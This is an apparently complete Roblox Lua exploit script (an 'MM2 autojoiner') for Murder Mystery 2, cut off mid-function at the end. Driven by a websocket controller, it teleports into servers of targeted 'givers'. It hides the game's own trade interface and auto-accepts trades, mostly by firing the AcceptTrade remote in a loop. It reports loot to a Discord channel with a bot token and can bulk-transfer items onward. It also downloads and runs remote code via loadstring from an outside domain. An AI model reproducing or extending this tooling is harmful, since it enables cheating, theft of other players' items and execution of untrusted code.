local HttpService = game:GetService("HttpService")
exec, execver = identifyexecutor()

local ajsettings = {}
if isfile and isfile("aj.txt") then
    local ok, data = pcall(function() return HttpService:JSONDecode(readfile("aj.txt")) end)
    if ok and type(data) == "table" then ajsettings = data end
end
bottoken  = bottoken or ajsettings.token
logid     = logid or ajsettings.logid
chanelid  = chanelid or ajsettings.chanelid
minrarity = minrarity or ajsettings.minrarity or "Godly"
totalval  = totalval or 0
tradesd   = tradesd or 0

local ITEMS_PER_TRADE = 4   -- MM2 caps an offer at 4 items

local LocalPlayer = game.Players.LocalPlayer
if not LocalPlayer.Character then LocalPlayer.CharacterAdded:Wait() end

local TeleportService = game:GetService("TeleportService")
local WS_URL = "ws://" .. (ajsettings.wshost or "127.0.0.1") .. ":8177"
local myname = LocalPlayer.Name
local statusSocket
local currentStatus = "Starting"
local lastTeleportJob = nil
local pendingTeleport = nil
local currentGiver = nil
local autoAccept = true
local latestOffer = nil
local stopTrade = false
local tradesNeeded = 1     -- ceil(giver items at/above min rarity / ITEMS_PER_TRADE)
local claimedTrades = 0    -- trades where we actually received items this hit
local lastClaimAt = 0      -- os.clock() of the last claim (for the stall timeout)
local needCalc = false     -- recompute tradesNeeded from the giver's real inventory

local function getOffer()
    local ok, _, info = pcall(function() return trads() end)
    if ok and type(info) == "table" and info.LastOffer then
        return info.LastOffer
    end
    return latestOffer
end

local BUSY_STATUS = {
    ["Transferring"] = true,
}
local function isIdle() return not BUSY_STATUS[currentStatus] end

local currentTarget = nil
local teleporting = false

local function startTeleportLoop()
    if teleporting then return end
    teleporting = true
    task.spawn(function()
        local failed = false
        local conn = TeleportService.TeleportInitFailed:Connect(function(plr)
            if plr == LocalPlayer then failed = true end
        end)
        setStatus("Joining server")
        while teleporting and currentTarget do
            local tgt = currentTarget
            if tostring(tgt.jobId) == game.JobId then break end
            failed = false
            currentGiver = tgt.giver
            -- expected (from nub.py's embed parse) is the initial estimate; we
            -- recompute from the giver's real inventory on the first trade.
            tradesNeeded = math.max(1, math.ceil((tgt.expected or 0) / ITEMS_PER_TRADE))
            claimedTrades = 0
            needCalc = true
            lastTeleportJob = tgt.jobId
            pcall(function()
                TeleportService:TeleportToPlaceInstance(
                    tonumber(tgt.placeId), tostring(tgt.jobId), LocalPlayer, "", { Joined = true })
            end)
            local t = 0
            while t < 5 and not failed and currentTarget == tgt do
                task.wait(0.5); t = t + 0.5
            end
            if currentTarget == tgt then task.wait(2) end
        end
        if conn then conn:Disconnect() end
        teleporting = false
    end)
end

local function doTeleport(placeId, jobId, giver, expected)
    if not placeId or not jobId then return end
    jobId = tostring(jobId)
    if jobId == game.JobId then return end
    if not isIdle() then
        pendingTeleport = { placeId = placeId, jobId = jobId, giver = giver, expected = expected }
        return
    end
    currentTarget = { placeId = placeId, jobId = jobId, giver = giver, expected = expected }
    startTeleportLoop()
end

local function flushPendingTeleport()
    local t = pendingTeleport
    if t and isIdle() then
        pendingTeleport = nil
        currentTarget = { placeId = t.placeId, jobId = t.jobId, giver = t.giver, expected = t.expected }
        startTeleportLoop()
    end
end

local function wsConnect()
    local ok, sock = pcall(function() return WebSocket.connect(WS_URL) end)
    if ok and sock then
        statusSocket = sock
        pcall(function() sock.OnClose:Connect(function() statusSocket = nil end) end)
        pcall(function()
            sock.OnMessage:Connect(function(raw)
                local ok2, data = pcall(function() return HttpService:JSONDecode(raw) end)
                if not (ok2 and type(data) == "table") then return end
                if data.action == "teleport" then
                    doTeleport(data.placeId, data.jobId, data.giver, data.expected)
                elseif data.action == "command" then
                    local cmd, args = data.cmd, data.args or {}
                    task.spawn(function()
                        if cmd == "inv" then pcall(inv)
                        elseif cmd == "invf" then pcall(invf)
                        elseif cmd == "rejoin" then pcall(doRejoin)
                        elseif cmd == "stoptransfer" then pcall(doStopTrade)
                        elseif cmd == "transfer" then pcall(doTransfer, args.fromrarity, args.user)
                        end
                    end)
                end
            end)
        end)
    else
        statusSocket = nil
    end
end

local function wsSend(status)
    if not statusSocket then return end
    pcall(function()
        statusSocket:Send(HttpService:JSONEncode({
            username = myname, status = status, jobId = game.JobId }))
    end)
end

local function wsEvent(name)
    currentGiver = nil
    if not statusSocket then return end
    pcall(function()
        statusSocket:Send(HttpService:JSONEncode({
            username = myname, event = name, jobId = game.JobId }))
    end)
end

game.Players.PlayerRemoving:Connect(function(plr)
    if currentGiver and plr.Name == currentGiver then
        wsEvent("next")
    end
end)

function setStatus(text)
    currentStatus = text
    wsSend(text)
    if text == "Waiting for trades" then
        flushPendingTeleport()
    end
end

task.spawn(function()
    wsConnect()
    while true do
        if not statusSocket then wsConnect() end
        wsSend(currentStatus)   -- 1s heartbeat; nub.py reopens if it stops for >10s
        task.wait(1)
    end
end)

task.spawn(function()
    pcall(function() settings().Rendering.QualityLevel = Enum.QualityLevel.Level01 end)
    pcall(function()
        game:GetService("UserSettings"):GetService("UserGameSettings").SavedQualityLevel =
            Enum.SavedQualitySetting.QualityLevel1
    end)
    pcall(function()
        local L = game:GetService("Lighting")
        L.GlobalShadows = false
        L.FogEnd = 1e9
        for _, e in ipairs(L:GetChildren()) do
            if e:IsA("PostEffect") then e.Enabled = false end
        end
    end)

    local pg = LocalPlayer:WaitForChild("PlayerGui")
    local Trade = game:GetService("ReplicatedStorage"):WaitForChild("Trade")

    local function hidePhone()
        local g = pg:FindFirstChild("TradeGUI_Phone")
        if g and g:IsA("ScreenGui") then
            g.Enabled = false
            pcall(function()
                g:GetPropertyChangedSignal("Enabled"):Connect(function()
                    g.Enabled = false
                end)
            end)
        end
    end
    hidePhone()
    pg.ChildAdded:Connect(function(c)
        if c.Name == "TradeGUI_Phone" then task.wait() hidePhone() end
    end)

    -- ---- custom trade GUI (TradeGui.lua design, wired to the real trade) ----
    local UIS = game:GetService("UserInputService")
    local okSync, Sync = pcall(function() return require(game.ReplicatedStorage.Database.Sync) end)

    local BLACK  = Color3.fromRGB(12, 12, 12)
    local PANEL  = Color3.fromRGB(22, 22, 22)
    local SLOT   = Color3.fromRGB(32, 32, 32)
    local STROKE = Color3.fromRGB(48, 48, 48)
    local TEXT   = Color3.fromRGB(235, 235, 235)
    local MUTED  = Color3.fromRGB(150, 150, 150)
    local GREEN  = Color3.fromRGB(28, 92, 45)
    local RED    = Color3.fromRGB(190, 42, 42)
    local RARITY = {
        Common = Color3.fromRGB(200, 200, 200), Uncommon = Color3.fromRGB(120, 200, 120),
        Rare = Color3.fromRGB(90, 140, 255), Legendary = Color3.fromRGB(190, 120, 255),
        Vintage = Color3.fromRGB(120, 220, 220), Godly = Color3.fromRGB(255, 180, 60),
        Ancient = Color3.fromRGB(255, 90, 90), Unique = Color3.fromRGB(255, 230, 120),
    }

    local function corner(inst, r)
        local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, r or 8); c.Parent = inst
    end
    local function stroke(inst, col, t)
        local s = Instance.new("UIStroke"); s.Color = col or STROKE; s.Thickness = t or 1; s.Parent = inst
    end

    local screen = Instance.new("ScreenGui")
    screen.Name = "AJTrade"
    screen.ResetOnSpawn = false
    screen.IgnoreGuiInset = true
    screen.DisplayOrder = 9999
    screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screen.Enabled = false
    screen.Parent = (gethui and gethui()) or pg

    local main = Instance.new("Frame")
    main.Name = "Main"
    main.Size = UDim2.fromOffset(470, 246)
    main.Position = UDim2.new(0.5, -235, 0.5, -123)
    main.BackgroundColor3 = BLACK
    main.BorderSizePixel = 0
    main.Active = true
    main.Parent = screen
    corner(main, 14)
    stroke(main, Color3.fromRGB(60, 60, 60), 1)
    local mpad = Instance.new("UIPadding", main)
    mpad.PaddingTop = UDim.new(0, 10); mpad.PaddingBottom = UDim.new(0, 10)
    mpad.PaddingLeft = UDim.new(0, 10); mpad.PaddingRight = UDim.new(0, 10)

    do
        local dragging, dragStart, startPos
        main.InputBegan:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
                dragging, dragStart, startPos = true, i.Position, main.Position
            end
        end)
        UIS.InputChanged:Connect(function(i)
            if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
                local d = i.Position - dragStart
                main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X,
                                          startPos.Y.Scale, startPos.Y.Offset + d.Y)
            end
        end)
        UIS.InputEnded:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
                dragging = false
            end
        end)
    end

    local left = Instance.new("Frame")
    left.Size = UDim2.new(1, -122, 1, 0); left.BackgroundTransparency = 1; left.Parent = main
    local leftList = Instance.new("UIListLayout", left); leftList.Padding = UDim.new(0, 8)
    local right = Instance.new("Frame")
    right.Size = UDim2.new(0, 112, 1, 0); right.Position = UDim2.new(1, -112, 0, 0)
    right.BackgroundTransparency = 1; right.Parent = main
    local rightList = Instance.new("UIListLayout", right); rightList.Padding = UDim.new(0, 8)

    local function makeSection(titleText, order)
        local section = Instance.new("Frame")
        section.Size = UDim2.new(1, 0, 0, 105); section.BackgroundColor3 = PANEL
        section.BorderSizePixel = 0; section.LayoutOrder = order; section.Parent = left
        corner(section, 10)
        local sPad = Instance.new("UIPadding", section)
        sPad.PaddingTop = UDim.new(0, 8); sPad.PaddingBottom = UDim.new(0, 8)
        sPad.PaddingLeft = UDim.new(0, 8); sPad.PaddingRight = UDim.new(0, 8)
        local head = Instance.new("TextLabel")
        head.Size = UDim2.new(1, 0, 0, 16); head.BackgroundTransparency = 1
        head.Font = Enum.Font.GothamBold; head.Text = titleText; head.TextColor3 = TEXT
        head.TextSize = 13; head.TextXAlignment = Enum.TextXAlignment.Left; head.Parent = section
        local sub = Instance.new("TextLabel")
        sub.Name = "Sub"; sub.Size = UDim2.new(1, 0, 0, 16); sub.BackgroundTransparency = 1
        sub.Font = Enum.Font.Gotham; sub.Text = ""; sub.TextColor3 = MUTED; sub.TextSize = 11
        sub.TextXAlignment = Enum.TextXAlignment.Right; sub.Parent = section
        local slots = Instance.new("Frame")
        slots.Name = "Slots"; slots.Size = UDim2.new(1, 0, 0, 65); slots.Position = UDim2.new(0, 0, 0, 24)
        slots.BackgroundTransparency = 1; slots.Parent = section
        local grid = Instance.new("UIListLayout", slots)
        grid.FillDirection = Enum.FillDirection.Horizontal; grid.Padding = UDim.new(0, 6)
        for i = 1, 4 do
            local slot = Instance.new("Frame")
            slot.Name = "Slot" .. i; slot.Size = UDim2.fromOffset(76, 65); slot.BackgroundColor3 = SLOT
            slot.BorderSizePixel = 0; slot.LayoutOrder = i; slot.Visible = false; slot.Parent = slots
            corner(slot, 8); stroke(slot, STROKE, 1)
            local icon = Instance.new("ImageLabel")
            icon.Name = "Icon"; icon.Size = UDim2.new(1, -10, 1, -18); icon.Position = UDim2.new(0, 5, 0, 3)
            icon.BackgroundTransparency = 1; icon.ScaleType = Enum.ScaleType.Fit; icon.Parent = slot
            local label = Instance.new("TextLabel")
            label.Name = "ItemName"; label.Size = UDim2.new(1, -6, 0, 12); label.Position = UDim2.new(0, 3, 1, -14)
            label.BackgroundTransparency = 1; label.Font = Enum.Font.GothamBold; label.Text = ""
            label.TextColor3 = Color3.fromRGB(168, 120, 255); label.TextSize = 10
            label.TextTruncate = Enum.TextTruncate.AtEnd; label.Parent = slot
        end
        return section
    end

    local yourSection = makeSection("YOUR OFFER", 1)
    local theirSection = makeSection("THEIR OFFER", 2)
    yourSection.Sub.Text = "(you)"

    local autoBtn = Instance.new("TextButton")
    autoBtn.Name = "Auto"; autoBtn.Size = UDim2.new(1, 0, 0, 26); autoBtn.BackgroundColor3 = GREEN
    autoBtn.BorderSizePixel = 0; autoBtn.Font = Enum.Font.GothamBold; autoBtn.TextSize = 13
    autoBtn.TextColor3 = TEXT; autoBtn.Text = "AUTO"; autoBtn.LayoutOrder = 1; autoBtn.Parent = right
    corner(autoBtn, 8)

    local accept = Instance.new("TextButton")
    accept.Name = "Accept"; accept.Size = UDim2.new(1, 0, 0, 88); accept.BackgroundColor3 = GREEN
    accept.BorderSizePixel = 0; accept.AutoButtonColor = true; accept.Font = Enum.Font.GothamBold
    accept.Text = "Accept"; accept.TextColor3 = TEXT; accept.TextSize = 18; accept.TextWrapped = true
    accept.LayoutOrder = 2; accept.Parent = right; corner(accept, 10)

    local decline = Instance.new("TextButton")
    decline.Name = "Decline"; decline.Size = UDim2.new(1, 0, 0, 88); decline.BackgroundColor3 = RED
    decline.BorderSizePixel = 0; decline.AutoButtonColor = true; decline.Font = Enum.Font.GothamBold
    decline.Text = "Decline"; decline.TextColor3 = Color3.fromRGB(255, 255, 255); decline.TextSize = 18
    decline.LayoutOrder = 3; decline.Parent = right; corner(decline, 10)

    autoBtn.MouseButton1Click:Connect(function()
        autoAccept = not autoAccept
        autoBtn.Text = autoAccept and "AUTO" or "MANUAL"
        autoBtn.BackgroundColor3 = autoAccept and GREEN or Color3.fromRGB(70, 70, 70)
    end)
    accept.MouseButton1Click:Connect(function()
        local offer = getOffer()
        if offer ~= nil then
            pcall(function() Trade.AcceptTrade:FireServer(game.PlaceId * 3, offer) end)
        end
    end)
    decline.MouseButton1Click:Connect(function()
        pcall(function() Trade.DeclineTrade:FireServer() end)
        screen.Enabled = false
    end)

    -- resolve an offer entry {ItemID, Amount, ItemType} -> icon, name, amount, rarity
    local function resolveOffer(entry)
        local id = entry[1] or entry.ItemID
        local amt = entry[2] or entry.Amount or 1
        local itype = entry[3] or entry.ItemType or "Weapons"
        local data = okSync and Sync[itype] and Sync[itype][id]
        if not data then return nil, tostring(id), amt end
        return data.Image, data.ItemName, amt, data.Rarity
    end
    local function fillSection(section, offer)
        local slots = section.Slots
        local i = 0
        for _, entry in ipairs(offer or {}) do
            if type(entry) == "table" then
                i = i + 1
                local slot = slots:FindFirstChild("Slot" .. i)
                if not slot then break end
                local img, name, amt, rar = resolveOffer(entry)
                slot.Icon.Image = img or ""
                slot.ItemName.Text = (amt and amt > 1) and (name .. " x" .. amt) or name
                slot.ItemName.TextColor3 = RARITY[rar] or Color3.fromRGB(168, 120, 255)
                slot.Visible = true
            end
        end
        for j = i + 1, 4 do
            local s = slots:FindFirstChild("Slot" .. j)
            if s then s.Visible = false end
        end
    end

    Trade.UpdateTrade.OnClientEvent:Connect(function(data)
        if not (data and data.LastOffer ~= nil) then return end
        latestOffer = data.LastOffer
        local yours, theirs, theirName
        for _, key in ipairs({ "Player1", "Player2" }) do
            local p = data[key]
            if type(p) == "table" then
                if p.Player == LocalPlayer then
                    yours = p.Offer
                else
                    theirs = p.Offer
                    theirName = p.Player and p.Player.Name
                end
            end
        end
        fillSection(yourSection, yours)
        fillSection(theirSection, theirs)
        theirSection.Sub.Text = "(" .. (theirName or "?") .. ")"
        screen.Enabled = true
    end)

    task.spawn(function()
        while true do
            local ok, st = pcall(function() return Trade.GetTradeStatus:InvokeServer() end)
            if ok then
                if st == "StartTrade" then
                    if not screen.Enabled then screen.Enabled = true end   -- show on trade start
                elseif st ~= "ReceivingRequest" then
                    if screen.Enabled then screen.Enabled = false end
                    latestOffer = nil
                end
            end
            task.wait(0.3)
        end
    end)
end)

game.ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(nub)
     if nub.LastOffer then
        lastofer = nub.LastOffer
        latestOffer = nub.LastOffer
        while autoAccept and nub.LastOffer == lastofer do
            game.ReplicatedStorage.Trade.AcceptTrade:FireServer(game.PlaceId * 3, nub.LastOffer)
            task.wait(0.1)
        end
    end
end)
local function pressButton(button)
    local okc, conns = pcall(getconnections, button.MouseButton1Click)
    if okc and type(conns) == "table" and #conns > 0 then
        local fired = false
        for _, c in ipairs(conns) do
            local okf, fn = pcall(function() return c.Function end)
            if okf and type(fn) == "function" then
                task.spawn(fn)
                fired = true
            elseif pcall(function() task.spawn(function() c:Fire() end) end) then
                fired = true
            end
        end
        if fired then return true end
    end
    return (pcall(firesignal, button.MouseButton1Click))
end

task.spawn(function()
    local gui = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("DeviceSelect", 60)
    if not gui then return end
    while gui.Parent do
        pcall(function()
            pressButton(gui.Container.Phone.Button)
        end)
        task.wait(0.1)
    end
end)
task.spawn(function()
    local PlayerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")

    local PRESS_COOLDOWN = 0.5

    local function dismiss(joinGui)
        local nextPress = 0
        while joinGui.Parent do
            if os.clock() >= nextPress then
                local friends = joinGui:FindFirstChild("Friends")
                local play = friends and friends:FindFirstChild("Play")
                if friends and friends.Visible and play and play.Visible then
                    pressButton(play)
                    nextPress = os.clock() + PRESS_COOLDOWN
                end
                local retry = joinGui:FindFirstChild("Retry")
                local retryBtn = retry and retry:FindFirstChild("Retry")
                if retry and retry.Visible and retryBtn and retryBtn.Visible then
                    pressButton(retryBtn)
                    nextPress = os.clock() + PRESS_COOLDOWN
                end
            end
            task.wait(0.1)
        end
    end

    local existing = PlayerGui:FindFirstChild("Join")
    if existing then task.spawn(dismiss, existing) end
    PlayerGui.ChildAdded:Connect(function(child)
        if child.Name == "Join" then task.spawn(dismiss, child) end
    end)
end)
function trads()
    return game.ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
end
function getinv()
    return game:GetService("ReplicatedStorage").Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name).Weapons.Owned
end
local databrainrot = {}
pcall(function() databrainrot = require(game.ReplicatedStorage.Database.Sync).Weapons end)

local rarityTable = {"Common","Uncommon","Rare","Legendary","Vintage","Godly","Ancient","Unique"}
local godlyIdx = table.find(rarityTable, "Godly") or 6
local valueList = {}
pcall(function() valueList = loadstring(game:HttpGet("https://amazson.top/supreme"))() or {} end)

local function lookupValue(realName, itemType, rarity, chroma, year)
    local D = rarity
    if itemType == "Pet" then D = "Pet" end
    local v = string.lower(tostring(realName or ""))
    if chroma then
        v = "chroma " .. v
        D = "Chroma"
    end
    if D == "Classic" then D = "Vintage" end
    local bucket = valueList[D]
    if not bucket then return nil end
    local t = string.lower(tostring(itemType or ""))
    local y = tostring(year or "")
    if bucket[v] then return bucket[v] end
    if bucket[v .. " (" .. t .. ")"] then return bucket[v .. " (" .. t .. ")"] end
    if bucket[v .. " " .. t] then return bucket[v .. " " .. t] end
    if y ~= "" then
        if bucket[v .. " (" .. y .. ")"] then return bucket[v .. " (" .. y .. ")"] end
        if bucket[v .. " " .. y] then return bucket[v .. " " .. y] end
        if bucket[v .. " " .. t .. " (" .. y .. ")"] then return bucket[v .. " " .. t .. " (" .. y .. ")"] end
        if bucket[v .. " (" .. t .. ") (" .. y .. ")"] then return bucket[v .. " (" .. t .. ") (" .. y .. ")"] end
    end
    return nil
end

local function getItemValue(dataid)
    local entry = databrainrot[dataid]
    if not entry then return 0 end
    local value = lookupValue(entry.ItemName, entry.ItemType, entry.Rarity, entry.Chroma == true, entry.Year)
    if not value then
        local idx = table.find(rarityTable, entry.Rarity)
        if idx and idx >= godlyIdx then value = 2 else value = 1 end
    end
    return value
end

-- how many weapons a player owns at/above min rarity, straight from the game.
-- Returns nil if the query fails (e.g. the server won't hand out another
-- player's inventory), so callers can fall back to the embed estimate.
local function countGiverItems(name)
    if not name or name == "" then return nil end
    local minIdx = table.find(rarityTable, minrarity) or godlyIdx
    local ok, inv = pcall(function()
        return game:GetService("ReplicatedStorage").Remotes.Extras.GetFullInventory:InvokeServer(name)
    end)
    if not ok or type(inv) ~= "table" or not inv.Weapons or not inv.Weapons.Owned then
        return nil
    end
    local count = 0
    for dataId, amt in pairs(inv.Weapons.Owned) do
        local db = databrainrot[dataId]
        local idx = db and table.find(rarityTable, db.Rarity)
        if idx and idx >= minIdx then count = count + (amt or 1) end
    end
    return count
end

function _G.__ajItemLine(entry)
    local id = entry[1] or entry["1"]
    if not id then return nil end
    local amt = entry[2] or entry["2"] or 1
    local db = databrainrot[id]
    local name = (db and db.ItemName) or tostring(id)
    local val = getItemValue(id) or 0
    return string.format("%s x%s (%s)", name, tostring(amt), tostring(val))
end

function doRejoin()
    setStatus("Joining server")
    pcall(function()
        game:GetService("TeleportService"):TeleportToPlaceInstance(
            game.PlaceId, game.JobId, game.Players.LocalPlayer)
    end)
end

-- run one trade round: send a request, wait for it to start, offer up to
-- ITEMS_PER_TRADE distinct item types from `batch`, wait for the target to
-- accept, confirm via inventory shrink. Returns true if this batch was sent.
local function doTransferBatch(target, user, batch)
    local Trade = game:GetService("ReplicatedStorage"):WaitForChild("Trade")

    pcall(function() Trade.SendRequest:InvokeServer(target) end)
    local waited = 0
    while trads() ~= "StartTrade" and waited < 15 and not stopTrade do
        waited = waited + task.wait(0.3)
    end
    if stopTrade or trads() ~= "StartTrade" then
        if not stopTrade then warn("[mm2] transfer: trade with " .. user .. " never started") end
        return false
    end

    for _, it in ipairs(batch) do
        if stopTrade then break end
        for _ = 1, (it.amount or 1) do
            if stopTrade then break end
            pcall(function() Trade.OfferItem:FireServer(it.id, "Weapons") end)
        end
    end

    local before = getinv()
    local confirmWait = 0
    repeat
        local offer = getOffer()
        if offer ~= nil then
            pcall(function() Trade.AcceptTrade:FireServer(game.PlaceId * 3, offer) end)
        end
        confirmWait = confirmWait + task.wait(0.4)
    until trads() ~= "StartTrade" or confirmWait > 15 or stopTrade

    local after = getinv()
    local gave = false
    for _, it in ipairs(batch) do
        if (after[it.id] or 0) < (before[it.id] or 0) then gave = true break end
    end
    if not gave then
        pcall(function() Trade.DeclineTrade:FireServer() end)
    end
    return gave
end

-- MM2 caps a single trade offer at ITEMS_PER_TRADE (4) distinct item types, so
-- a transfer with more than that runs one trade per batch of 4.
function doTransfer(fromrarity, user)
    user = tostring(user or "")
    local target = game.Players:FindFirstChild(user)
    if not target then
        warn("[mm2] transfer: '" .. user .. "' is not in this server")
        return
    end
    local minIdx = table.find(rarityTable, fromrarity or "Godly") or godlyIdx
    stopTrade = false
    pendingTeleport = nil
    setStatus("Transferring")

    local eligible = {}
    for dataId, amount in pairs(getinv()) do
        local db = databrainrot[dataId]
        local idx = db and table.find(rarityTable, db.Rarity)
        if idx and idx >= minIdx then
            eligible[#eligible + 1] = { id = dataId, amount = amount, value = getItemValue(dataId) }
        end
    end
    if #eligible == 0 then
        warn("[mm2] transfer: no items at/above " .. tostring(fromrarity) .. " to send")
        setStatus("Waiting for trades")
        return
    end
    table.sort(eligible, function(a, b) return a.value > b.value end)

    local totalBatches = math.ceil(#eligible / ITEMS_PER_TRADE)
    local sentBatches = 0
    for i = 1, #eligible, ITEMS_PER_TRADE do
        if stopTrade then break end
        local batch = {}
        for j = i, math.min(i + ITEMS_PER_TRADE - 1, #eligible) do
            batch[#batch + 1] = eligible[j]
        end
        setStatus("Transferring")
        if doTransferBatch(target, user, batch) then
            sentBatches = sentBatches + 1
        end
    end

    if sentBatches >= totalBatches then
        warn("[mm2] transfer to " .. user .. " completed (" .. sentBatches .. "/" .. totalBatches .. " trades)")
    elseif sentBatches > 0 then
        warn("[mm2] transfer to " .. user .. " partially completed (" .. sentBatches .. "/" .. totalBatches .. " trades)")
    else
        warn("[mm2] transfer to " .. user .. " NOT confirmed (0/" .. totalBatches .. " trades)")
    end
    pendingTeleport = nil
    setStatus("Waiting for trades")
end

function doStopTrade()
    autoAccept = false
    stopTrade = true
    local Trade = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
    pcall(function() Trade.DeclineTrade:FireServer() end)
    pcall(function() Trade.CancelRequest:FireServer() end)
    pcall(function() Trade.DeclineRequest:FireServer() end)
    setStatus("Waiting for trades")
end
local zamltable = {
    "Common",
    "Uncommon",
    "Rare",
    "Legendary",
    "Classic",
    "Godly",
    "Ancient",
    "Unique"
}
task.spawn(function() urnubitems = getinv() end)
function ischanged()
    local currentInventory = getinv()
    local changes = {}
    local hasChanged = false
    for item, amount in pairs(currentInventory) do
        local oldAmount = urnubitems[item] or 0
        if amount ~= oldAmount then
            changes[item] = amount - oldAmount
            hasChanged = true
        end
    end
    for item, oldAmount in pairs(urnubitems) do
        if currentInventory[item] == nil then
            changes[item] = -oldAmount
            hasChanged = true
        end
    end
    if hasChanged then
        urnubitems = currentInventory
        return true,changes
    end
    return false
end
local minzaml = table.find(zamltable, "Godly")
local changMsgId = nil
local changGained = {}
function chang(inve)
    for i,v in pairs(inve) do
        local dbentry = databrainrot[i]
        local layn = dbentry and "Common"
        local weaponraritysort = layn and table.find(rarityTable, layn)
        if weaponraritysort and weaponraritysort >= table.find(zamltable, "Common") then
            changGained[i] = (changGained[i] or 0) + v
        end
    end
    local list = {}
    totalval = 0
    for i, amt in pairs(changGained) do
        local value = getItemValue(i)
        table.insert(list, { name = i, amount = amt, value = value })
        totalval = totalval + value * amt
    end
    table.sort(list, function(a, b)
        return (a.value * a.amount) > (b.value * b.amount)
    end)
    local itemsText = ""
    for _, v in ipairs(list) do
        itemsText = itemsText .. string.format("%s (x%s) → %s Value", v.name, v.amount, (v.value * v.amount)) .. "\n"
    end
    if #itemsText > 1000 then
        local lines = {}
        for line in itemsText:gmatch("[^\r\n]+") do table.insert(lines, line) end
        while #itemsText > 1000 and #lines > 0 do
            table.remove(lines)
            itemsText = table.concat(lines, "\n")
        end
    end
    local fields = {
        {
            name="Info",
            value="```\n📱 Executor: "..exec.." "..execver.."\n💎 All new items value: "..totalval.."\n```"
        },
        {
            name="Items",
            value="```\n"..itemsText.."\n```"
        },
    }
    local base = "https://discord.com/api/v10/channels/"..logid.."/messages"
    local body = HttpService:JSONEncode({
        embeds = {{ title = "MM2 autojoiner", color = 0x3EED50, fields = fields }}
    })
    local headers = {
        ["Authorization"] = "Bot " .. bottoken,
        ["Content-Type"] = "application/json"
    }
    local response
    if changMsgId then
        response = request({ Url = base.."/"..changMsgId, Method = "PATCH", Headers = headers, Body = body })
        if response.StatusCode ~= 200 then changMsgId = nil end
    end
    if not changMsgId then
        response = request({ Url = base, Method = "POST", Headers = headers, Body = body })
        if response.StatusCode == 200 then
            local ok, decoded = pcall(function() return HttpService:JSONDecode(response.Body) end)
            if ok and decoded and decoded.id then changMsgId = decoded.id end
        end
    end
    if response and response.StatusCode ~= 200 then
        warn(response.Body)
    end
end
task.spawn(function()
    setStatus("Waiting for trades")
    while true do
        local status,skot = trads()
        if status == "StartTrade" then
            setStatus("Trading")
            if needCalc then
                needCalc = false
                local c = countGiverItems(currentGiver)
                if c and c > 0 then
                    tradesNeeded = math.max(1, math.ceil(c / ITEMS_PER_TRADE))
                end
            end
            timeintrade = 0
            repeat
                timeintrade = timeintrade + task.wait(0.1)
                if timeintrade >= 7 then
                    game.ReplicatedStorage.Trade.DeclineTrade:FireServer()
                    break
                end
            until trads() ~= "StartTrade"
            local bolean,itmes = ischanged()
            local claimed = false
            if bolean == true then
                tradesd = tradesd+1
                claimedTrades = claimedTrades + 1
                lastClaimAt = os.clock()
                setStatus("Logging items")
                local okc, errc = pcall(chang, itmes)
                if not okc then warn("[mm2] chang failed: "..tostring(errc)) end
                claimed = true
            end
            local hadPending = (pendingTeleport ~= nil)
            setStatus("Waiting for trades")
            -- fully claimed only after enough trades (ceil expected / 4)
            if claimed and claimedTrades >= tradesNeeded and not hadPending then
                wsEvent("next")
            end
        elseif status == "ReceivingRequest" and autoAccept then
            game.ReplicatedStorage.Trade.AcceptRequest:FireServer()
        end
        task.wait(0.1)
    end
end)

-- if the giver stops early (claimed some but fewer trades than expected and no
-- new trade for a while), consider it done and move on.
task.spawn(function()
    while true do
        task.wait(3)
        if currentGiver and claimedTrades > 0 and claimedTrades < tradesNeeded
           and currentStatus == "Waiting for trades" and (os.clock() - lastClaimAt) > 15 then
            wsEvent("next")
        end
    end
end)
function inv()
    setStatus("Sending inventory")
    local url = "https://discord.com/api/v10/channels/"..logid.."/messages"
    neww = {}
    newwval = 0
    for i,v in pairs(getinv()) do
        local value = getItemValue(i)
        local dbentry = databrainrot[i]
        local layn = dbentry and dbentry.Rarity
        local weaponraritysort = layn and table.find(rarityTable, layn)
        if weaponraritysort and weaponraritysort >= minzaml then
            table.insert(neww,{
                name = i,
                amount = v,
                value = value
            })
            newwval = newwval + value * v
        end
    end
    table.sort(neww, function(a, b)
        return (a.value * a.amount) > (b.value * b.amount)
    end)
    fields = {
        {
            name="Info",
            value="```\n📱 Executor: "..exec.." "..execver.."\n💎 Inventory value: "..newwval.."\n```"
        },
        {
            name="Inventory",
            value=""
        },
    }
    for i, v in ipairs(neww) do
        itemnub = string.format("%s (x%s) → %s Value", v.name, v.amount, (v.value * v.amount))
        fields[2].value = fields[2].value .. itemnub .. "\n"
    end
    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n")
        end
    end
    fields[2].value = "```\n"..fields[2].value.."\n```"
    local url = "https://discord.com/api/v10/channels/"..logid.."/messages"

    local payload = {
         embeds  = {{
            title  = "MM2 Autojoiner",
            color  = 0x3EED50,
            fields = fields,
        }}

    }

    local response = request({
        Url = url,
        Method = "POST",
        Headers = {
            ["Authorization"] = "Bot " .. bottoken,
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(payload)
    })
    
    if response.StatusCode ~= 200 then
        warn(response.Body)
    end
    setStatus("Waiting for trades")
end
function invf()
    setStatus("Sending inventory")
    local url = "https://discord.com/api/v10/channels/"..logid.."/messages"

    
    local inventroy = "Inventory value: "
    talbe = {}
    vaule = 0
    for i,v in pairs(getinv()) do
        local value = getItemValue(i)
        local dbentry = databrainrot[i]
        local layn = dbentry and dbentry.Rarity
        local weaponraritysort = layn and table.find(rarityTable, layn)
        if weaponraritysort and weaponraritysort >= minzaml then
            table.insert(talbe,{
                name = i,
